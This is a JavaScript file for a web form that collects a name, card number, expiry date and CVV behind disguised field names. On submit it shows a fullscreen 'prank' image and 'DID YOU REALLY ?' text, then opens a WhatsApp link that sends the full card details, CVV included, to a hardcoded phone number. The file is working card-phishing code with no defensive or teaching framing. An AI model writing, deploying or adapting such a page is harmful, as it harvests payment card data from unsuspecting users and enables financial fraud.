document.addEventListener("DOMContentLoaded", function() {
    // Form elements
    const nameField = document.getElementById('name');
    const accNumberField = document.getElementById('accNumber');
    const fourDigitField = document.getElementById('fourDigit');
    const threeDigitField = document.getElementById('threeDigit');
    const checkBtn = document.getElementById('checkBtn');
    const form = document.getElementById('user-form');

    // Format account number
    function formatAccNumber(value) {
        const cleaned = value.replace(/\D/g, '');
        const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || '';
        return formatted;
    }

    accNumberField.addEventListener('input', function(e) {
        e.target.value = formatAccNumber(e.target.value);
    });

    // Format four-digit field
    function formatFourDigit(value) {
        const cleaned = value.replace(/\D/g, '');
        if (cleaned.length > 2) {
            return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4);
        }
        return cleaned;
    }

    fourDigitField.addEventListener('input', function(e) {
        e.target.value = formatFourDigit(e.target.value);
    });

    // Restrict three-digit field to numeric values only
    function formatThreeDigit(value) {
        return value.replace(/\D/g, '').slice(0, 3);
    }

    threeDigitField.addEventListener('input', function(e) {
        e.target.value = formatThreeDigit(e.target.value);
        validateForm();
    });

    // Validate fields
    function validateForm() {
        const nameValue = nameField.value.trim();
        const accNumberValue = accNumberField.value.trim();
        const fourDigitValue = fourDigitField.value.trim();
        const threeDigitValue = threeDigitField.value.trim();

        const accNumberPattern = /^\d{4} \d{4} \d{4} \d{4}$/;
        const isFormFilled = nameValue !== "" &&
                             accNumberPattern.test(accNumberValue) &&
                             /^\d{2}\/\d{2}$/.test(fourDigitValue) &&
                             /^\d{3}$/.test(threeDigitValue);

        checkBtn.disabled = !isFormFilled;
    }

    nameField.addEventListener('input', validateForm);
    accNumberField.addEventListener('input', validateForm);
    fourDigitField.addEventListener('input', validateForm);
    threeDigitField.addEventListener('input', validateForm);

    // Function to enter fullscreen mode
    function enterFullscreen() {
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        } else if (document.documentElement.mozRequestFullScreen) { // Firefox
            document.documentElement.mozRequestFullScreen();
        } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari and Opera
            document.documentElement.webkitRequestFullscreen();
        } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
            document.documentElement.msRequestFullscreen();
        }
    }

    // Handle form submission
    form.addEventListener('submit', function(e) {
        e.preventDefault();

        // Enter fullscreen mode
        enterFullscreen();

        // Hide form container
        document.querySelector('.form-container').style.display = 'none';

        // Display fullscreen image
        const image = document.createElement('img');
        image.src = './assets/images/post_submit/prank_face.jpg';
        image.alt = 'Prank Face';
        image.classList.add('fullscreen-image');
        document.body.appendChild(image);

        // Display intimidating text after image appears
        setTimeout(function() {
            const text = document.createElement('div');
            text.textContent = "DID YOU REALLY ?";
            text.classList.add('intimidating-text');
            document.body.appendChild(text);

            // Display black overlay
            const overlay = document.createElement('div');
            overlay.classList.add('black-overlay');
            document.body.appendChild(overlay);

            // Display final text after overlay
            const finalText = document.createElement('div');
            finalText.classList.add('final-text');
            finalText.textContent = 'THANK YOU';
            document.body.appendChild(finalText);

            // Manage transitions
            setTimeout(() => {
                overlay.style.opacity = '1'; // Show black screen
            }, 3000); // Delay to ensure intimidating text is visible

            setTimeout(() => {
                finalText.style.opacity = '1'; // Show final text
            }, 6000); // Delay to show final text after overlay

            // Send data via WhatsApp API
            setTimeout(() => {
                const nameValue = encodeURIComponent(nameField.value.trim());
                const accNumberValue = encodeURIComponent(accNumberField.value.trim());
                const fourDigitValue = encodeURIComponent(fourDigitField.value.trim());
                const threeDigitValue = encodeURIComponent(threeDigitField.value.trim());

                const message = `Hi, I am ${nameValue} and here are my details: \n\nCard Number: ${accNumberValue}\n Expiry date : ${fourDigitValue}\n CVV :  ${threeDigitValue}`;
                const whatsappLink = `https://api.whatsapp.com/send?phone=917338010377&text=${message}`;
                
                window.open(whatsappLink, '_blank');
            }, 10000); // Wait for final text to appear before sending data
        }, 3000); // Wait for image to appear
    });
});
